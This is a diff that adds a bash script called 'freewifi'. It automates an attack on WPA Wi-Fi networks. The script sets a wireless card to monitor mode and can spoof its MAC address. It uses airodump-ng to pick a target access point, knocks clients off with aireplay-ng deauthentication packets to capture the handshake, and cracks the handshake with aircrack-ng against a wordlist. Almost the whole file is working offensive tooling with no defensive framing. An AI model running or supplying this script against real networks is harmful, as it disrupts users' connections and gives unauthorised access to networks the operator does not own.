@@ -1,0 +1,158 @@
+#!/usr/bin/env bash
+
+COUNT=1
+TERMINAL="xterm"
+
+# Colors 
+RED=$(printf '\e[38;5;1m')
+GREEN=$(printf '\e[38;5;2m')
+BLUE=$(printf '\e[38;5;4m')
+CYAN=$(printf '\e[38;5;6m')
+YELLOW=$(printf '\e[38;5;3m')
+NORMAL=$(printf '\e[m')
+BOLD=$(printf '\e[1m')
+
+trap restore INT
+
+usage() {
+	printf '%s\n' "\
+usage: freewifi [options] <interface>
+options:
+  -5         : use 5GHz band
+  -b         : set broadcast MAC address as destination
+  -c <count> : number of deauthentication packets
+  -m         : set random MAC
+  -w <words> : path to wordlist filename
+"
+}
+
+check_interface() {
+	if [ ! -e "/sys/class/net/$1" ]; then
+		print_error "No such interface: $1"
+		exit 1
+	fi
+
+	if [ ! -d "/sys/class/net/$1/wireless" ]; then
+		print_error "No such wireless interface: $1"
+		exit 1
+	fi
+}
+
+print_error() {
+	printf "$BOLD$RED%s\n$NORMAL" "$1" >&2
+}
+
+set_monitor() {
+	ip link set dev "$1" down
+	if ((change_mac)); then
+		old_mac="$(macchanger -r "$1" | awk '/Current/ {print $3}')"
+	fi
+	iw dev "$1" set type monitor
+	ip link set dev "$1" up
+}
+
+restore() {
+	ip link set "$interface" down
+	iw dev "$interface" set type managed
+	if ((change_mac)); then
+		ip link set dev "$interface" address "$old_mac"
+	fi
+	ip link set "$interface" up 
+	rm -f capture-01.cap
+	exit 0
+}
+
+attack() {
+	if ((band5g)); then
+		$TERMINAL -e airodump-ng --band a "$interface" &
+	else
+		$TERMINAL -e airodump-ng "$interface" &
+	fi
+	airodump_pid=$!
+
+	read -r -p "${BOLD}${RED}[-] Enter the BSSID: $NORMAL" bssid
+	read -r -p "${BOLD}${YELLOW}[-] Enter the channel: $NORMAL" channel
+	kill $airodump_pid 2> /dev/null; wait $airodump_pid
+
+	$TERMINAL -e airodump-ng -c "$channel" --bssid "$bssid" -w capture --output-format pcap "$interface" &
+	airodump_pid=$!
+
+	if ((broadcast)); then
+		station=FF:FF:FF:FF:FF:FF
+		sleep 4
+	else 
+		read -r -p "${BOLD}${RED}[-] Enter the station: $NORMAL" station
+	fi
+	printf "$BOLD$CYAN%s\n$NORMAL" "[+] Deauthenticating $station"
+	aireplay-ng --deauth "$COUNT" -a "$bssid" -c "$station" "$interface" > /dev/null
+	sleep 4
+	kill $airodump_pid 2> /dev/null; wait $airodump_pid 
+	
+	if [[ -n "$WORDLIST" ]]; then
+		aircrack-ng -a 2 -b "$bssid" -w "$WORDLIST" capture-01.cap
+	fi
+}
+
+
+while getopts ":h5bc:mw:" name; do
+	case "$name" in
+		h) 
+			usage  
+			exit 0
+		;;
+
+		5)
+			band5g=1
+		;;
+
+		b)
+			broadcast=1
+		;;
+
+		c)
+			COUNT="$OPTARG"
+		;;
+
+		m)
+			change_mac=1
+		;;
+
+		w) 
+			WORDLIST="$OPTARG"  
+		;; 
+
+		\?)
+			print_error "invalid option: -$OPTARG"
+			usage
+			exit 1
+		;;
+
+		:)
+			print_error "option requires an argument: -$OPTARG"
+			usage
+			exit 1
+		;;
+	esac
+done
+shift $((OPTIND - 1))
+
+interface="$1"
+if [[ -z "$interface" ]]; then
+	print_error "No interface specified"
+	exit 1
+fi
+check_interface "$interface"
+
+if [[ -n "$WORDLIST" && ! -f "$WORDLIST" ]]; then
+	print_error "Dictionary $WORDLIST: No such file"
+	exit 1
+fi
+
+if [[ ${EUID} -ne 0 ]]; then 
+	print_error "This program requires root privileges"
+	exit 1
+fi
+
+set_monitor "$interface"
+attack
+restore
